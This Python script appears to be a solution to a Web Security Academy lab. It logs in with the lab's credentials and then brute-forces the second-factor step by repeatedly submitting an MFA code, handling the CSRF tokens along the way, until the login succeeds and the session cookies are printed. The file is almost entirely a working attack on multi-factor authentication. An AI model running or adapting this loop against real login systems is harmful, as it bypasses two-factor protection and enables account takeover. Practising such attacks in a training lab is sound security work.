import requests
from bs4 import BeautifulSoup

LOGIN_1 = "https://0a9e00680376dd3f80ff2797004700b6.web-security-academy.net/login"
LOGIN_2 = "https://0a9e00680376dd3f80ff2797004700b6.web-security-academy.net/login2"

# def post_mfa(count: str, csrf_token):
#     session = requests.Session()
#     mfa = count.zfill(4)
#     print(f"[+] Sending POST request with MFA code: {mfa}")
    
#     response = session.post(LOGIN_2, data={'mfa-code': mfa, 'csrf': csrf_token})
#     print(f"[+] Response: {response.text}") 
#     if 'Incorrect security code' in response.text:
#         print("[-] Incorrect security code")
#         return False
#     return True

def login():
    session = requests.Session()
    
    response = session.get(LOGIN_1)
    soup = BeautifulSoup(response.text, 'html.parser')
    form = soup.find('form')

    csrf_input = form.find('input', {'name': 'csrf'})
    if csrf_input is None:
        print("[-] CSRF token not found in login page")
        return False

    csrf_value = csrf_input.get('value')
    print(f"[+] Found CSRF token: {csrf_value}")

    response = session.post(LOGIN_1, data={
        'csrf': csrf_value,
        'username': 'carlos',
        'password': 'montoya'
    })
    
    if response.status_code != 200:
        print("[-] Login failed")
        return False
    print("[+] Login Phase 1 successful")   
    
    response = session.get(LOGIN_2)
    soup = BeautifulSoup(response.text, 'html.parser')
    mfa_form = soup.find('form')
    
    if not mfa_form:
        print("[-] MFA form not found")
        return False
    
    mfa_csrf_input = mfa_form.find('input', {'name': 'csrf'})
    if not mfa_csrf_input:
        print("[-] CSRF token not found in MFA page")
        return False
    
    mfa_csrf_value = mfa_csrf_input.get('value')
    print(f"[+] Found MFA CSRF token: {mfa_csrf_value}")
    
    mfa = "0453"
    print(f"[+] Sending POST request with MFA code: {mfa}")
    
    response = session.post(LOGIN_2, data={
        'csrf': mfa_csrf_value,
        'mfa-code': mfa
    })
    
    
    if 'Incorrect security code' in response.text:
        print("[-] Incorrect security code")
        return False
    
    if 'Incorrect security code' not in response.text:
        print("[+] Login successful!")
        print("[+] Cookie: ", session.cookies.get_dict())
        return True
    
    return False

while True:
    if(login()):
        break